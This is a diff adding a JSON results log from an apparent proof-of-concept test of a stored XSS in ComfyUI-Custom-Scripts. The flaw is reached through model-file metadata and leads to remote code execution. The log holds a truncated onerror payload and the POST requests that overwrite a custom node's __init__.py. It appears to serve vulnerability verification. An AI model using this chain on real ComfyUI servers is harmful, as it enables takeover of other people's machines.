@@ -1,0 +1,281 @@
+{
+  "browser_args": [
+    "--no-sandbox",
+    "--disable-dev-shm-usage",
+    "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1"
+  ],
+  "component_commit_observed": "609f3afaa74b2f88ef9ce8d939626065e3247469",
+  "control_handler_alive": true,
+  "drive": "playwright chromium vs the real ComfyUI frontend; real drop + right-click + menu click",
+  "environment_control": "external host names made unresolvable in the browser (equivalent to the offline condition of the earlier run in this corpus); loopback unaffected",
+  "negative_control_clean": true,
+  "payload_ran": true,
+  "product": "ComfyUI + ComfyUI-Custom-Scripts",
+  "product_commit_observed": "387f98aa2822f684b8597959a52a467d88cc4806",
+  "restart_pending": "tested separately by verify_restart.py",
+  "root_key": "comfy.custom_scripts_modelspec_staged_rce",
+  "sink_confirmed": true,
+  "staged_overwrite": true,
+  "staged_sha256": "7cf4c61327f582c3e67a5bbd3e766291d8eec3a53e2df97d32837374ad6b276d",
+  "started_utc": "2026-09-27T07:08:59Z",
+  "steps": [
+    {
+      "headers": {
+        "csp": "absent"
+      },
+      "step": "0a_csp_headers"
+    },
+    {
+      "console_all": [
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "warning: [ComfyUI] The legacy queue/history menu is deprecated. Core functionality in this menu may break at any time. Issues and feature requests related to the legacy menu will not be addressed. To ",
+        "warning: [ComfyUI] The legacy queue/history menu is deprecated. Core functionality in this menu may break at any time. Issues and feature requests related to the legacy menu will not be addressed. To ",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: ComfyApp graph accessed before initialization",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "warning: Extension pysssss.FaviconStatus is disabled.",
+        "warning: Extension pysssss.SnapToGrid is disabled.",
+        "warning: [ComfyUI Notice] \"scripts/widgets.js\" is an internal module, not part of the public API. Future updates may break this import.",
+        "warning: [ComfyUI Deprecated] Importing from \"scripts/ui.js\" is deprecated and will be removed in v1.34.",
+        "warning: [ComfyUI Notice] \"scripts/pnginfo.js\" is an internal module, not part of the public API. Future updates may break this import.",
+        "warning: [MaskEditor] ComfyApp.open_maskeditor is deprecated. Plugins should migrate to using the command system or direct node context menu integration.",
+        "warning: %c[DEPRECATED]%c Monkey-patching getCanvasMenuOptions is deprecated. (Extension: \"pysssss.NodeFinder\")\nPlease use the new context menu API instead.\n\nSee: https://docs.comfy.org/custom-nodes/j",
+        "warning: %c[DEPRECATED]%c Monkey-patching getCanvasMenuOptions is deprecated. (Extension: \"pysssss.GraphArrange\")\nPlease use the new context menu API instead.\n\nSee: https://docs.comfy.org/custom-nodes",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "warning: [ComfyUI Deprecated] Importing from \"scripts/ui/components/button.js\" is deprecated and will be removed in v1.34.",
+        "warning: widget.inputEl is deprecated. Use widget.element instead. undefined",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)"
+      ],
+      "dom": {
+        "description_html": null,
+        "has_dompurify": "undefined",
+        "iframe_present": false,
+        "img_attr_len": null,
+        "img_complete": null,
+        "img_connected": null,
+        "img_current_src": null,
+        "img_natural_width": null,
+        "img_outer_full_len": null,
+        "img_present": false,
+        "img_same_document": null,
+        "innerHTML_setter_native": true,
+        "meta_csp": null,
+        "onerror_is_null": null,
+        "onerror_type": null,
+        "token_vector_a": null,
+        "token_vector_b": null,
+        "trusted_types_default_policy": false
+      },
+      "drop": "dropped",
+      "expect_payload": false,
+      "handler_diag": {
+        "error": "no-img"
+      },
+      "inline_handler_control": {
+        "attr": "window.__lcs_control=1",
+        "onerror_type": "function",
+        "same_doc": true
+      },
+      "inline_handler_control_fired": 1,
+      "located": {
+        "type": "LoraLoaderModelOnly",
+        "widget": "benign_cs.safetensors"
+      },
+      "menu_entry_visible": true,
+      "model": "benign_cs.safetensors",
+      "phase": "negctl",
+      "right_click_attempts": 1,
+      "sink_assigned_innerHTML": false,
+      "state_after": {
+        "marker": null,
+        "marker_exists": false,
+        "temp_uploads": [],
+        "victim_init_is_staged": false,
+        "victim_init_sha256": "363601e3819c05a05a1f0d0a8f635018d50d8641ef80cae12fddc0534755058a"
+      },
+      "state_before": {
+        "marker": null,
+        "marker_exists": false,
+        "temp_uploads": [],
+        "victim_init_is_staged": false,
+        "victim_init_sha256": "363601e3819c05a05a1f0d0a8f635018d50d8641ef80cae12fddc0534755058a"
+      },
+      "token_final": null,
+      "token_forced": "no-img",
+      "token_natural": null
+    },
+    {
+      "method": "POST",
+      "post_data": "",
+      "step": "page_originated_request",
+      "url": "/upload/image"
+    },
+    {
+      "method": "POST",
+      "post_data": "",
+      "step": "page_originated_request",
+      "url": "/upload/image"
+    },
+    {
+      "status": 200,
+      "step": "page_originated_response",
+      "url": "/upload/image"
+    },
+    {
+      "method": "POST",
+      "post_data": "{\"type\":\"temp\",\"subfolder\":\"\",\"filename\":\"staged_init.py\"}",
+      "step": "page_originated_request",
+      "url": "/pysssss/save/custom_nodes%2FVictim-Demo-Pack%2F__init__.py"
+    },
+    {
+      "status": 200,
+      "step": "page_originated_response",
+      "url": "/upload/image"
+    },
+    {
+      "method": "POST",
+      "post_data": "{\"type\":\"temp\",\"subfolder\":\"\",\"filename\":\"staged_init.py\"}",
+      "step": "page_originated_request",
+      "url": "/pysssss/save/custom_nodes%2FVictim-Demo-Pack%2F__init__.py"
+    },
+    {
+      "status": 200,
+      "step": "page_originated_response",
+      "url": "/pysssss/save/custom_nodes%2FVictim-Demo-Pack%2F__init__.py"
+    },
+    {
+      "status": 200,
+      "step": "page_originated_response",
+      "url": "/pysssss/save/custom_nodes%2FVictim-Demo-Pack%2F__init__.py"
+    },
+    {
+      "method": "POST",
+      "post_data": "",
+      "step": "page_originated_request",
+      "url": "/upload/image"
+    },
+    {
+      "status": 200,
+      "step": "page_originated_response",
+      "url": "/upload/image"
+    },
+    {
+      "method": "POST",
+      "post_data": "{\"type\":\"temp\",\"subfolder\":\"\",\"filename\":\"staged_init.py\"}",
+      "step": "page_originated_request",
+      "url": "/pysssss/save/custom_nodes%2FVictim-Demo-Pack%2F__init__.py"
+    },
+    {
+      "status": 200,
+      "step": "page_originated_response",
+      "url": "/pysssss/save/custom_nodes%2FVictim-Demo-Pack%2F__init__.py"
+    },
+    {
+      "console_all": [
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "warning: [ComfyUI] The legacy queue/history menu is deprecated. Core functionality in this menu may break at any time. Issues and feature requests related to the legacy menu will not be addressed. To ",
+        "warning: [ComfyUI] The legacy queue/history menu is deprecated. Core functionality in this menu may break at any time. Issues and feature requests related to the legacy menu will not be addressed. To ",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: ComfyApp graph accessed before initialization",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "warning: Extension pysssss.SnapToGrid is disabled.",
+        "warning: [ComfyUI Deprecated] Importing from \"scripts/ui.js\" is deprecated and will be removed in v1.34.",
+        "warning: Extension pysssss.FaviconStatus is disabled.",
+        "warning: [ComfyUI Notice] \"scripts/widgets.js\" is an internal module, not part of the public API. Future updates may break this import.",
+        "warning: [ComfyUI Notice] \"scripts/pnginfo.js\" is an internal module, not part of the public API. Future updates may break this import.",
+        "warning: [MaskEditor] ComfyApp.open_maskeditor is deprecated. Plugins should migrate to using the command system or direct node context menu integration.",
+        "warning: %c[DEPRECATED]%c Monkey-patching getCanvasMenuOptions is deprecated. (Extension: \"pysssss.GraphArrange\")\nPlease use the new context menu API instead.\n\nSee: https://docs.comfy.org/custom-nodes",
+        "warning: %c[DEPRECATED]%c Monkey-patching getCanvasMenuOptions is deprecated. (Extension: \"pysssss.NodeFinder\")\nPlease use the new context menu API instead.\n\nSee: https://docs.comfy.org/custom-nodes/j",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "warning: [ComfyUI Deprecated] Importing from \"scripts/ui/components/button.js\" is deprecated and will be removed in v1.34.",
+        "warning: widget.inputEl is deprecated. Use widget.element instead. undefined",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: net::ERR_NAME_NOT_RESOLVED",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)",
+        "error: Failed to load resource: the server responded with a status of 404 (Not Found)"
+      ],
+      "dom": {
+        "description_html": "<img src=\"x\" onerror=\"const s=atob('IyBSZXBsYWNlbWVudCBpbml0aWFsaXplciBmb3IgVmljdGltLURlbW8tUGFjay4KIyBEZWxpdmVyZWQgYnkgdGhlIGNoYWluOiBzYWZldGVuc29ycyBfX21ldGFkYXRhX18gLT4gaW5uZXJIVE1MIC0+IHNhbWUtb3JpZ2luCiMgd3JpdGUgdG8gY3VzdG9tX25vZGVzLy4gSW1wb3J0ZWQgYW5kIGV4ZWN1dGVkIGJ5IENvbWZ5VUkgYXQgdGhlIG5leHQg",
+        "has_dompurify": "undefined",
+        "iframe_present": true,
+        "img_attr_len": 1610,
+        "img_complete": true,
+        "img_connected": true,
+        "img_current_src": "http://127.0.0.1:8188/x",
+        "img_natural_width": 0,
+        "img_outer_full_len": 1646,
+        "img_present": true,
+        "img_same_document": true,
+        "innerHTML_setter_native": true,
+        "meta_csp": null,
+        "onerror_is_null": false,
+        "onerror_type": "function",
+        "token_vector_a": "A:200",
+        "token_vector_b": "B:200",
+        "trusted_types_default_policy": false
+      },
+      "drop": "dropped",
+      "expect_payload": true,
+      "handler_diag": {
+        "attr_head": "const s=atob('IyBSZXBsYWNlbWVudCBpbml0aWFsaXplciBmb3IgVmljdGltLURlbW8tUGFjay4KIy",
+        "attr_len": 1610,
+        "attr_tail": ").then(r=>{window.__mbe2e='A:'+r.status}).catch(e=>{window.__mbe2e='A:ERR-'+e});",
+        "compile": "ok",
+        "complete": true,
+        "connected": true,
+        "current_src": "http://127.0.0.1:8188/x",
+        "natural_width": 0,
+        "onerror_type": "function",
+        "same_document": true
+      },
+      "inline_handler_control": {
+        "attr": "window.__lcs_control=1",
+        "onerror_type": "function",
+        "same_doc": true
+      },
+      "inline_handler_control_fired": 1,
+      "located": {
+        "type": "LoraLoaderModelOnly",
+        "widget": "evil_cs.safetensors"
+      },
+      "menu_entry_visible": true,
+      "model": "evil_cs.safetensors",
+      "phase": "attack",
+      "right_click_attempts": 1,
+      "sink_assigned_innerHTML": true,
+      "state_after": {
+        "marker": null,
+        "marker_exists": false,
+        "temp_uploads": [
+          "staged_init.py"
+        ],
+        "victim_init_is_staged": true,
+        "victim_init_sha256": "7cf4c61327f582c3e67a5bbd3e766291d8eec3a53e2df97d32837374ad6b276d"
+      },
+      "state_before": {
+        "marker": null,
+        "marker_exists": false,
+        "temp_uploads": [],
+        "victim_init_is_staged": false,
+        "victim_init_sha256": "363601e3819c05a05a1f0d0a8f635018d50d8641ef80cae12fddc0534755058a"
+      },
+      "token_final": "A:200",
+      "token_forced": "A:200",
+      "token_natural": "A:200"
+    }
+  ],
+  "which_vector": "A:200",
+  "xss_confirmed": true
+}
